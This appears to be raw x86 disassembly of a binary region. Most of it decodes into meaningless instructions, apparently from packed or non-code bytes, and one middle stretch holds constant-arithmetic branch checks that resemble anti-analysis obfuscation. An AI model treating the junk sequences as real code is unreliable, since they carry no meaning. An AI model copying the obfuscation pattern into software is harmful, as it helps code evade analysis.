  41be18:	in     al,dx
  41be19:	popa   
  41be1a:	mov    al,0x44
  41be1c:	pusha  
  41be1d:	xor    bh,al
  41be1f:	mov    DWORD PTR [ebp-0x72],esi
  41be22:	pusha  
  41be23:	dec    esp
  41be24:	push   esi
  41be25:	xor    al,0x4d
  41be27:	mov    al,ds:0xf7a5241a
  41be2c:	xlat   BYTE PTR ds:[ebx]
  41be2d:	fdiv   QWORD PTR [ebx+0x4b6e0c40]
  41be33:	int    0xed
  41be35:	and    ah,BYTE PTR [edx-0x56]
  41be38:	int    0x50
  41be3a:	xchg   ebx,eax
  41be3b:	arpl   WORD PTR [eax-0x5f],si
  41be3e:	mov    dl,0x6d
  41be40:	stos   DWORD PTR es:[edi],eax
  41be41:	pop    edi
  41be42:	out    0xf4,al
  41be44:	mov    esi,0x12663f73
  41be49:	mov    al,0xff
  41be4b:	push   cs
  41be4c:	mov    WORD PTR [esi+0x76afd25a],?
  41be52:	jp     0x41bea1
  41be54:	or     DWORD PTR [ebx],0x87dddade
  41be5a:	retf   
  41be5b:	das    
  41be5c:	int    0x35
  41be5e:	push   edi
  41be5f:	cli    
  41be60:	inc    ecx
  41be61:	pop    ebx
  41be62:	xchg   ebp,eax
  41be63:	pushf  
  41be64:	imul   ecx,DWORD PTR [edx-0x1e],0x77
  41be68:	arpl   WORD PTR [ebp+ebp*4-0x2fd0347f],sp
  41be6f:	sahf   
  41be70:	jge    0x41be1d
  41be72:	ror    ebp,0x43
  41be75:	out    0x3a,al
  41be77:	push   ss
  41be78:	lock fwait
  41be7a:	cwde   
  41be7b:	sbb    bl,BYTE PTR [edi+0x2c0378b0]
  41be81:	shl    ch,0x8
  41be84:	loope  0x41be88
  41be86:	ret    0xfb55
  41be89:	cmp    bl,BYTE PTR [esi+eax*1+0x68]
  41be8d:	popf   
  41be8e:	xor    eax,edi
  41be90:	dec    eax
  41be91:	xor    DWORD PTR [eax-0x33],ecx
  41be94:	fidivr WORD PTR [edi+0x2]
  41be97:	rol    ch,cl
  41be99:	je     0x41be3e
  41be9b:	add    ebp,DWORD PTR [esi+0x67fa51db]
  41bea1:	inc    eax
  41bea2:	call   0xa123:0xd7560cc1
  41bea9:	or     eax,0x8f3a2683
  41beae:	dec    ebp
  41beaf:	bound  ecx,QWORD PTR [ebp+ecx*2+0x78]
  41beb3:	shr    bh,cl
  41beb5:	sub    ebx,DWORD PTR [ebp+0x3153f0c9]
  41bebb:	shl    DWORD PTR [ebp+0x45],0xfd
  41bebf:	int    0xc2
  41bec1:	pop    es
  41bec2:	pop    ss
  41bec3:	int3   
  41bec4:	shl    DWORD PTR [edx+0x3c790ab9],cl
  41beca:	jns    0x41beb0
  41becc:	sub    al,0xe3
  41bece:	in     eax,dx
  41becf:	fbstp  TBYTE PTR [edi-0x19]
  41bed2:	push   edx
  41bed3:	push   ss
  41bed4:	imul   ebx,DWORD PTR [ebx],0xffffffce
  41bed7:	sar    BYTE PTR [edi],0x80
  41beda:	cld    
  41bedb:	sti    
  41bedc:	mov    dh,bh
  41bede:	addr16 pop edx
  41bee0:	xchg   dh,bh
  41bee2:	in     al,0xd
  41bee4:	jge    0x41be67
  41bee6:	out    0xb5,eax
  41bee8:	out    0x1f,al
  41beea:	inc    edi
  41beeb:	push   es
  41beec:	hlt    
  41beed:	jno    0x41bf62
  41beef:	call   0x198fab17
  41bef4:	ins    DWORD PTR es:[edi],dx
  41bef5:	inc    esi
  41bef6:	cs dec edi
  41bef8:	shr    DWORD PTR [esi],1
  41befa:	pop    es
  41befb:	stos   DWORD PTR es:[edi],eax
  41befc:	adc    eax,0x41077692
  41bf01:	add    BYTE PTR [esi+ecx*1-0x67],al
  41bf05:	jnp    0x41beb8
  41bf07:	stos   BYTE PTR es:[edi],al
  41bf08:	test   BYTE PTR ds:0x36eb95e,cl
  41bf0e:	xor    ebp,ecx
  41bf10:	(bad)  
  41bf11:	xchg   edx,eax
  41bf12:	sub    edx,DWORD PTR [eax+0x21]
  41bf15:	or     eax,0xc7b59328
  41bf1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf1b:	test   DWORD PTR [edi+0x2b],0x89166c16
  41bf22:	mov    bl,0xb
  41bf24:	xchg   edi,eax
  41bf25:	lock cmc 
  41bf27:	cdq    
  41bf28:	and    al,0x2b
  41bf2a:	inc    ecx
  41bf2b:	jmp    0x41bf62
  41bf2d:	cmp    al,0xad
  41bf2f:	arpl   WORD PTR [edi+0x10fe461e],sp
  41bf35:	sub    DWORD PTR [ecx-0x31085165],edi
  41bf3b:	mov    al,ds:0x40226fbf
  41bf40:	mov    al,ds:0xb885633f
  41bf45:	je     0x41bf1a
  41bf47:	popf   
  41bf48:	dec    BYTE PTR [esi-0x68]
  41bf4b:	stos   BYTE PTR es:[edi],al
  41bf4c:	cld    
  41bf4d:	mov    al,0x84
  41bf4f:	sar    DWORD PTR [edx-0x34b33adc],1
  41bf55:	cmc    
  41bf56:	and    BYTE PTR [esi+0x2e195d65],dl
  41bf5c:	pop    ds
  41bf5d:	pop    eax
  41bf5e:	call   0x1820aa26
  41bf63:	mov    ds:0xd0fc1b1b,eax
  41bf68:	or     eax,0xfec3a160
  41bf6d:	xor    dh,bl
  41bf6f:	loopne 0x41bfc0
  41bf71:	(bad)  [edi-0x25]
  41bf74:	popa   
  41bf75:	inc    ebp
  41bf76:	jg     0x41befd
  41bf78:	(bad)  
  41bf79:	out    dx,eax
  41bf7a:	or     eax,0xdbad2d36
  41bf7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf80:	jle    0x41bfac
  41bf82:	daa    
  41bf83:	sti    
  41bf84:	mov    eax,ds:0x78247adb
  41bf89:	mov    bh,0xf
  41bf8b:	lds    edi,FWORD PTR [edx+0x797ed678]
  41bf91:	pop    es
  41bf92:	icebp  
  41bf93:	xor    eax,0x330bbbd2
  41bf98:	jmp    0xa924491e
  41bf9d:	sbb    dh,BYTE PTR [ecx+0x70]
  41bfa0:	div    BYTE PTR [ecx+0x5ee68ea1]
  41bfa6:	cmp    al,0xa4
  41bfa8:	mov    al,ds:0x6bd7583f
  41bfad:	mov    gs,WORD PTR [edi]
  41bfaf:	arpl   WORD PTR [ecx],ax
  41bfb1:	push   eax
  41bfb2:	shr    dh,cl
  41bfb4:	mov    edx,0xb884241
  41bfb9:	mov    ah,0x47
  41bfbb:	popf   
  41bfbc:	mov    edi,0xd4b9ac9b
  41bfc1:	push   edi
  41bfc2:	add    BYTE PTR [eax],al
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	popa   
  41c0f7:	pop    ebx
  41c0f8:	and    eax,0x1679a7aa
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x52601818],bh
  41c104:	cmp    ah,BYTE PTR [edi]
  41c106:	daa    
  41c107:	repnz push ds
  41c109:	and    eax,0xb033d406
  41c10e:	dec    ebx
  41c10f:	mov    bl,0xdc
  41c111:	xchg   esi,eax
  41c112:	(bad)
  41c115:	pop    es
  41c116:	mov    ah,0x4
  41c118:	jae    0x41c10f
  41c11a:	cs (bad) 
  41c11c:	(bad)  [ecx-0x24]
  41c11f:	fimul  WORD PTR [esi-0x10]
  41c122:	addr16 inc ebp
  41c124:	mov    esi,0x87d769c6
  41c129:	xor    BYTE PTR [edx],ah
  41c12b:	jmp    0x1f994490
  41c130:	lods   eax,DWORD PTR ds:[esi]
  41c131:	dec    ecx
  41c132:	lods   al,BYTE PTR ds:[esi]
  41c133:	push   ecx
  41c134:	xor    bh,BYTE PTR [edx]
  41c136:	dec    edi
  41c137:	sbb    eax,0xdef1e8c0
  41c13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c13d:	imul   esp,DWORD PTR [ebp+0x309ff931],0xd893e07
  41c147:	enter  0x288f,0x23
  41c14b:	lahf   
  41c14c:	fmul   DWORD PTR [edi+0x67cabf0d]
  41c152:	and    bl,ch
  41c154:	mov    ebx,0x8e184988
  41c159:	shl    BYTE PTR [ecx-0x1d],cl
  41c15c:	test   eax,0x6f501e7c
  41c161:	loope  0x41c184
  41c163:	and    BYTE PTR [ebx-0x2122e8ff],al
  41c169:	pop    eax
  41c16a:	lea    esp,[ecx-0x3e64987d]
  41c170:	les    edx,FWORD PTR [eax+0x7a1069cc]
  41c176:	xor    BYTE PTR [edi],al
  41c178:	mov    ebp,DWORD PTR [ecx]
  41c17a:	int3   
  41c17b:	mov    al,0xcb
  41c17d:	sub    bh,BYTE PTR [ebx]
  41c17f:	push   eax
  41c180:	adc    DWORD PTR [edx-0x5c533e67],ebp
  41c186:	imul   esp,DWORD PTR [ebx-0x22],0x71
  41c18a:	(bad)  
  41c18b:	stc    
  41c18c:	cmp    DWORD PTR [ecx+0x63cfa957],esp
  41c192:	lea    eax,[edi]
  41c194:	mov    DWORD PTR [esi-0x31],ebp
  41c197:	loop   0x41c154
  41c199:	and    dl,BYTE PTR [ebp-0x2e]
  41c19c:	icebp  
  41c19d:	adc    ebx,DWORD PTR [esi+edx*8]
  41c1a0:	aaa    
  41c1a1:	mov    ecx,0xf8c2381d
  41c1a6:	dec    esp
  41c1a7:	mov    bh,0x27
  41c1a9:	call   0xb918:0x977c759
  41c1b0:	fild   DWORD PTR [ecx-0x20]
  41c1b3:	jecxz  0x41c1cf
  41c1b5:	lea    eax,[ecx]
  41c1b7:	fcmovb st,st(5)
  41c1b9:	std    
  41c1ba:	and    eax,0xaabdc52b
  41c1bf:	icebp  
  41c1c0:	sahf   
  41c1c1:	pop    ds
  41c1c2:	stos   DWORD PTR es:[edi],eax
  41c1c3:	jge    0x41c1c2
  41c1c5:	lock icebp 
  41c1c7:	hlt    
  41c1c8:	dec    edx
  41c1c9:	add    ebp,DWORD PTR [ebp-0x59c5b4e]
  41c1cf:	ss adc ebx,esi
  41c1d2:	push   esi
  41c1d3:	sar    edi,1
  41c1d5:	xlat   BYTE PTR ds:[ebx]
  41c1d6:	dec    edx
  41c1d7:	rcr    dh,1
  41c1d9:	pushf  
  41c1da:	lahf   
  41c1db:	mov    ebx,0x1a310c08
  41c1e0:	std    
  41c1e1:	sub    esi,ebx
  41c1e3:	mov    dh,0xbb
  41c1e5:	lods   eax,DWORD PTR ds:[esi]
  41c1e6:	xbegin 0x80a23864
  41c1ec:	imul   esp,DWORD PTR [di-0x3b1e],0x26
  41c1f2:	repz dec eax
  41c1f4:	mov    al,ds:0xe805f29f
  41c1f9:	xchg   edi,eax
  41c1fa:	mov    eax,0x898ad122
  41c1ff:	mov    ds:0x72e0406d,al
  41c204:	out    dx,eax
  41c205:	in     eax,0xd3
  41c207:	push   es
  41c208:	xchg   edi,eax
  41c209:	clc    
  41c20a:	pop    ebp
  41c20b:	scas   al,BYTE PTR es:[edi]
  41c20c:	pop    es
  41c20d:	push   0x337f792d
  41c212:	dec    ebp
  41c213:	jae    0x41c27e
  41c215:	fdivr  QWORD PTR [edx]
  41c217:	cmp    cl,ch
  41c219:	push   0xb5cf2456
  41c21e:	cld    
  41c21f:	outs   dx,DWORD PTR ds:[esi]
  41c220:	pop    ecx
  41c221:	sbb    cl,BYTE PTR [ebp-0xb]
  41c224:	lock test DWORD PTR [esi+esi*4-0x2d],edi
  41c229:	dec    ah
  41c22b:	adc    esi,DWORD PTR [eax]
  41c22d:	mov    WORD PTR [edx-0x486fb646],cs
  41c233:	jne    0x41c207
  41c235:	pusha  
  41c236:	inc    esp
  41c237:	pusha  
  41c238:	and    edx,DWORD PTR [edx+0x40]
  41c23b:	xchg   ecx,eax
  41c23c:	xchg   DWORD PTR [ecx-0x2a],esp
  41c23f:	mov    eax,ds:0x267ae054
  41c244:	cmp    al,0xf2
  41c246:	mov    dl,0xb6
  41c248:	sub    eax,0x1fa25f7e
  41c24d:	pop    es
  41c24e:	scas   al,BYTE PTR es:[edi]
  41c24f:	cmp    edx,DWORD PTR [esi+0x196c3d0b]
  41c255:	or     cl,BYTE PTR [ebx+0x412eab95]
  41c25b:	cld    
  41c25c:	jno    0x41c25b
  41c25e:	enter  0x5049,0xb7
  41c262:	xor    ah,BYTE PTR [ebp+0x38f43bb7]
  41c268:	pop    edi
  41c269:	mov    edi,0x8718a4a3
  41c26e:	inc    DWORD PTR [ebx]
  41c270:	enter  0xa980,0x6f
  41c274:	mov    DWORD PTR [ebx+0xc],0x3749055
  41c27b:	jns    0x41c282
  41c27d:	dec    edx
  41c27e:	jl     0x41c22c
  41c280:	pop    edx
  41c281:	sub    DWORD PTR [edi],ebp
  41c283:	pusha  
  41c284:	jae    0x41c2d3
  41c286:	call   0xdc63ca54
  41c28b:	sbb    esi,DWORD PTR [esi]
  41c28d:	ja     0x41c26c
  41c28f:	xor    DWORD PTR [eax+0x60],eax
  41c292:	jo     0x41c280
  41c294:	and    esp,edx
  41c296:	adc    BYTE PTR [edx+0x31],0xa7
  41c29a:	aaa    
  41c29b:	aas    
  41c29c:	retf   0x8e88
  41c29f:	mov    al,0x3b
  41c2a1:	inc    ebp
  41c2a2:	cmp    al,bh
  41c2a4:	xor    eax,0xff94e114
  41c2a9:	mov    al,ds:0x8d3a01f6
  41c2ae:	push   esp
  41c2af:	sub    DWORD PTR [esi-0x58201946],0xa49570de
  41c2b9:	hlt    
  41c2ba:	push   ecx
  41c2bb:	jp     0x41c2b2
  41c2bd:	and    ebx,DWORD PTR [ecx]
  41c2bf:	and    BYTE PTR [ebx-0x5042595],0x28
  41c2c6:	push   esp
  41c2c7:	dec    edx
  41c2c8:	pop    eax
  41c2c9:	jmp    0x33a2:0x3cc9e58d
  41c2d0:	mov    ds,WORD PTR [esi-0x42e2176c]
  41c2d6:	idiv   DWORD PTR [edi]
  41c2d8:	xchg   ebp,eax
  41c2d9:	mov    fs,WORD PTR [ebx-0x2bd36884]
  41c2df:	mov    eax,0x264d2e22
  41c2e4:	cs jecxz 0x41c28a
  41c2e7:	sbb    DWORD PTR [edx],edx
  41c2e9:	push   esp
  41c2ea:	in     al,0xa6
  41c2ec:	jge    0x41c2e4
  41c2ee:	jmp    0xefd5:0xa41ea32c
  41c2f5:	out    dx,al
  41c2f6:	inc    ebx
  41c2f7:	lods   al,BYTE PTR ds:[esi]
  41c2f8:	jecxz  0x41c28d
  41c2fa:	xchg   ebp,eax
  41c2fb:	push   eax
  41c2fc:	or     eax,0x6a405855
  41c301:	in     al,dx
  41c302:	imul   eax,ebx,0xfffffff9
  41c305:	popa   
  41c306:	iret   
  41c307:	and    ebx,edi
  41c309:	and    al,0x47
  41c30b:	xlat   BYTE PTR ds:[ebx]
  41c30c:	dec    ebp
  41c30d:	mov    al,ds:0x122d25d9
  41c312:	pop    ds
  41c313:	sbb    bl,BYTE PTR [esp+eax*4-0x56]
  41c317:	sub    DWORD PTR [eax+0x69799731],ebp
  41c31d:	nop
  41c31e:	sub    BYTE PTR [ebp-0x74962d3e],ah
  41c324:	daa    
  41c325:	add    DWORD PTR [esi],esi
  41c327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c328:	(bad)  
  41c329:	into   
  41c32a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c32b:	xor    BYTE PTR [eax+esi*4],dl
  41c32e:	cmp    bl,BYTE PTR [eax]
  41c330:	pop    esi
  41c331:	dec    eax
  41c332:	cmp    DWORD PTR [edi-0x4234c685],eax
  41c338:	pop    edx
  41c339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c33a:	xchg   ecx,eax
  41c33b:	or     DWORD PTR [edx-0x1d],ebx
  41c33e:	mov    al,ds:0x86975f8c
  41c343:	mov    al,0x87
  41c345:	xchg   edi,eax
  41c346:	xchg   ebx,eax
  41c347:	imul   esi,DWORD PTR [edi+eiz*1+0x54],0xc290825c
  41c34f:	sub    ecx,esi
  41c351:	pop    esi
  41c352:	and    al,BYTE PTR [ebp-0x8]
  41c355:	sbb    BYTE PTR [eax],0x40
  41c358:	pusha  
  41c359:	inc    esi
  41c35a:	out    0xff,eax
  41c35c:	xchg   ebx,eax
  41c35d:	xlat   BYTE PTR ds:[ebx]
  41c35e:	add    edx,edi
  41c360:	out    dx,eax
  41c361:	pushf  
  41c362:	sub    BYTE PTR [ecx],al
  41c364:	adc    bh,dl
  41c366:	imul   ebx,eax,0x59b769ac
  41c36c:	(bad)  
  41c36d:	in     al,0xca
  41c36f:	popf   
  41c370:	pop    esp
  41c371:	pusha  
  41c372:	retf   0xf8cd
  41c375:	test   eax,0x9e312144
  41c37a:	sub    eax,0xfb6b74eb
  41c37f:	rcr    DWORD PTR [ecx-0x54],1
  41c382:	push   edx
  41c383:	or     eax,0xbde81421
  41c388:	mov    cs,WORD PTR [edx+esi*4+0x8]
  41c38c:	daa    
  41c38d:	ret    
  41c38e:	push   es
  41c38f:	enter  0xa793,0x8
  41c393:	shr    BYTE PTR [edx+eax*2+0x4dc6e1a0],1
  41c39a:	call   0xb523:0x3beb32a2
  41c3a1:	pop    ds
  41c3a2:	jb     0x41c372
  41c3a4:	and    BYTE PTR [ebp+0x7e56be37],0x6f
  41c3ab:	in     eax,dx
  41c3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ad:	cmp    eax,0x312b359e
  41c3b2:	pop    ebx
  41c3b3:	fild   DWORD PTR [ebp-0x80]
  41c3b6:	stos   BYTE PTR es:[edi],al
  41c3b7:	loopne 0x41c340
  41c3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ba:	leave  
  41c3bb:	and    BYTE PTR [edi+0x1c],bh
  41c3be:	(bad)  
  41c3bf:	and    DWORD PTR [edi],ebp
  41c3c1:	int    0x74
  41c3c3:	or     al,0xa2
  41c3c5:	pop    edi
  41c3c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c7:	push   esp
  41c3c8:	stos   BYTE PTR es:[edi],al
  41c3c9:	ror    BYTE PTR [ebx+0x25],1
  41c3cc:	dec    edi
  41c3cd:	jl     0x41c390
  41c3cf:	rcl    DWORD PTR [esi-0x26],cl
  41c3d2:	test   BYTE PTR [edx+0x4d3734c9],dl
  41c3d8:	repz enter 0x9ec5,0x17
  41c3dd:	pop    es
  41c3de:	and    DWORD PTR [ebp+0x19],ebp
  41c3e1:	xchg   DWORD PTR [esi+0x7f9f509b],ebp
  41c3e7:	call   eax
  41c3e9:	aad    0xf9
  41c3eb:	sub    esp,DWORD PTR [edx-0x28]
  41c3ee:	or     eax,0x6453ff12
  41c3f3:	jp     0x41c446
  41c3f5:	out    0xd2,eax
  41c3f7:	adc    eax,0x9863c08a
  41c3fc:	ret    0x1188
  41c3ff:	ret    0xc672
  41c402:	fiadd  DWORD PTR [ebx]
  41c404:	popf   
  41c405:	or     edi,esp
  41c407:	pop    ebp
  41c408:	test   eax,0x9311dd68
  41c40d:	jge    0x41c3c6
  41c40f:	mov    al,0x85
  41c411:	and    ch,BYTE PTR [edx+0x27]
  41c414:	xor    ch,BYTE PTR [edi+0x1a]
  41c417:	mov    esi,DWORD PTR [ecx+0x32f3bcd4]
  41c41d:	xor    DWORD PTR [ecx-0x10],ebp
  41c420:	pop    esp
  41c421:	pop    eax
  41c422:	stos   BYTE PTR es:[edi],al
  41c423:	jg     0x41c3e6
  41c425:	lods   al,BYTE PTR ds:[esi]
  41c426:	jae    0x41c489
  41c428:	shr    esp,cl
  41c42a:	adc    DWORD PTR [edx-0x44bbc93b],edx
  41c430:	cmp    ecx,ecx
  41c432:	call   0xd856:0xe812ddb
  41c439:	and    dh,cl
  41c43b:	repnz rcl DWORD PTR [eax],1
  41c43e:	rcl    DWORD PTR [edi],0x16
  41c441:	ror    BYTE PTR [ebx],cl
  41c443:	push   cs
  41c444:	or     esi,ebp
  41c446:	pop    es
  41c447:	add    esi,DWORD PTR ds:0x3b71a6ab
  41c44d:	pushf  
  41c44e:	iret   
  41c44f:	sub    al,0xd8
  41c451:	into   
  41c452:	or     DWORD PTR [eax-0x43],edx
  41c455:	(bad)  [ecx+0x7d3f39a3]
  41c45b:	add    cl,al
  41c45d:	or     al,0x95
  41c45f:	push   eax
  41c460:	ror    DWORD PTR [ebp-0x2215bbf9],1
  41c466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c467:	shl    DWORD PTR [edx],1
  41c469:	gs ds or dl,ah
  41c46d:	lds    edx,FWORD PTR [edi-0x42]
  41c470:	loope  0x41c4ea
  41c472:	je     0x41c46b
  41c474:	ret    0xdfba
  41c477:	or     eax,0x47b5d8e9
  41c47c:	leave  
  41c47d:	xor    eax,0xf9e03635
  41c482:	cld    
  41c483:	push   ebp
  41c484:	mov    al,ds:0x3c0bfe54
  41c489:	dec    BYTE PTR [esi]
  41c48b:	ins    BYTE PTR es:[edi],dx
  41c48c:	adc    DWORD PTR [ecx-0x7fcf6b1f],edx
  41c492:	test   DWORD PTR [ebx],edx
  41c494:	jno    0x41c48a
  41c496:	mov    ebx,DWORD PTR [esi-0xe]
  41c499:	outs   dx,DWORD PTR ds:[esi]
  41c49a:	and    ecx,DWORD PTR [ebx-0x4e]
  41c49d:	mov    edi,0x21ca62b8
  41c4a2:	inc    edi
  41c4a3:	inc    ebp
  41c4a4:	js     0x41c494
  41c4a6:	and    BYTE PTR [eax+0x31b5ee37],cl
  41c4ac:	cdq    
  41c4ad:	push   ebx
  41c4ae:	cmp    esp,0x22
  41c4b1:	cmp    esp,DWORD PTR [ecx]
  41c4b3:	lods   eax,DWORD PTR ds:[esi]
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c482
  41c4cb:	jnp    0x41c454
  41c4cd:	jl     0x41c519
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1-0x2bb8e7e8],bh
  41c4d8:	rcr    esi,cl
  41c4da:	sub    eax,esi
  41c4dc:	fst    QWORD PTR [edi+0x35439e32]
  41c4e2:	mov    edx,0xd62cc60e
  41c4e7:	lock xchg ecx,eax
  41c4e9:	in     al,0x83
  41c4eb:	sbb    eax,0x4e4ba4f3
  41c4f0:	bound  eax,QWORD PTR [eax+0x1]
  41c4f3:	(bad)  
  41c4f4:	push   edx
  41c4f5:	fild   QWORD PTR [ecx-0x1ab90eaf]
  41c4fb:	sbb    al,0xe7
  41c4fd:	jg     0x41c487
  41c4ff:	push   esp
  41c500:	or     BYTE PTR [eax],al
  41c502:	(bad)  
  41c503:	jge    0x41c4d8
  41c505:	add    eax,0xb9712105
  41c50a:	addr16 push ebp
  41c50c:	jns    0x41c546
  41c50e:	sar    bh,0xbb
  41c511:	jo     0x41c578
  41c513:	or     DWORD PTR [edx+esi*8],ecx
  41c516:	push   0x2221cd9e
  41c51b:	out    0x6d,eax
  41c51d:	add    BYTE PTR [edx],al
  41c51f:	cs ret 
  41c521:	sbb    BYTE PTR cs:[ecx-0x1],bh
  41c525:	ds (bad) 
  41c527:	(bad)  
  41c528:	push   ebp
  41c529:	dec    esp
  41c52a:	stc    
  41c52b:	pop    edx
  41c52c:	jae    0x41c5a4
  41c52e:	pop    edx
  41c52f:	pop    ebp
  41c530:	mov    dh,0x44
  41c532:	retf   
  41c533:	xchg   BYTE PTR [edi+edx*1],bl
  41c536:	shl    dh,1
  41c538:	popa   
  41c539:	sbb    edx,DWORD PTR ds:0x9cb2333b
  41c53f:	mov    eax,ds:0x27fe644b
  41c544:	xchg   esi,eax
  41c545:	jnp    0x41c52d
  41c547:	jmp    0x7e43:0x3a191160
  41c54e:	jle    0x41c4e7
  41c550:	stos   DWORD PTR es:[edi],eax
  41c551:	sub    BYTE PTR [esi-0x30],bh
  41c554:	jmp    0x41c5ab
  41c556:	xchg   edi,eax
  41c557:	pop    edi
  41c558:	dec    esp
  41c559:	fdivr  QWORD PTR [eax+0x520dfb1d]
  41c55f:	enter  0xde15,0xd2
  41c563:	das    
  41c564:	or     DWORD PTR [edx],0xed612c61
  41c56a:	int    0x28
  41c56c:	inc    cl
  41c56e:	jecxz  0x41c500
  41c570:	in     al,0x14
  41c572:	xor    bl,0x71
  41c575:	pop    ebx
  41c576:	fwait
  41c577:	add    dl,BYTE PTR [ebx]
  41c579:	pop    ds
  41c57a:	imul   ecx,DWORD PTR [eax+0x77b79b2e],0xffffffc6
  41c581:	adc    ebp,ecx
  41c583:	(bad)  
  41c584:	stos   BYTE PTR es:[edi],al
  41c585:	mov    ah,0xb6
  41c587:	push   edx
  41c588:	mov    DWORD PTR [edx-0x7d],esp
  41c58b:	call   0x706ae62
  41c590:	fs pop eax
  41c592:	sbb    ebp,esp
  41c594:	jl     0x41c55b
  41c596:	mov    BYTE PTR [edx],ah
  41c598:	cmp    DWORD PTR [ecx-0x7d],esp
  41c59b:	leave  
  41c59c:	xor    BYTE PTR [edx+0x16],bh
  41c59f:	sub    bl,BYTE PTR [esi+0x5584e1c7]
  41c5a5:	aam    0x92
  41c5a7:	int3   
  41c5a8:	test   al,0xff
  41c5aa:	push   ebx
  41c5ab:	inc    esi
  41c5ac:	test   ch,cl
  41c5ae:	clc    
  41c5af:	cmp    DWORD PTR [eax-0x4ea7a9b0],edx
  41c5b5:	shl    al,0x75
  41c5b8:	shr    BYTE PTR [edi-0x1ceaf661],cl
  41c5be:	retf   0x3130
  41c5c1:	sub    ebx,DWORD PTR [ecx-0x48]
  41c5c4:	rol    DWORD PTR [edi-0x10ecdd48],1
  41c5ca:	xor    BYTE PTR [ebx+edx*2-0x2a],bh
  41c5ce:	mov    ds:0x721a940f,al
  41c5d3:	pop    ebx
  41c5d4:	repz adc DWORD PTR [ecx-0x1a],eax
  41c5d8:	inc    edi
  41c5d9:	imul   ebp,DWORD PTR [esi+0x28],0xffffff80
  41c5dd:	sub    dh,BYTE PTR [edi]
  41c5df:	sub    eax,DWORD PTR [ebx-0x74]
  41c5e2:	leave  
  41c5e3:	pop    ebp
  41c5e4:	lods   al,BYTE PTR ds:[esi]
  41c5e5:	stos   DWORD PTR es:[edi],eax
  41c5e6:	mov    al,0x7b
  41c5e8:	inc    esp
  41c5e9:	std    
  41c5ea:	push   0x868a7feb
  41c5ef:	ret    
  41c5f0:	das    
  41c5f1:	and    BYTE PTR [ebx],cl
  41c5f3:	pop    ebp
  41c5f4:	cmc    
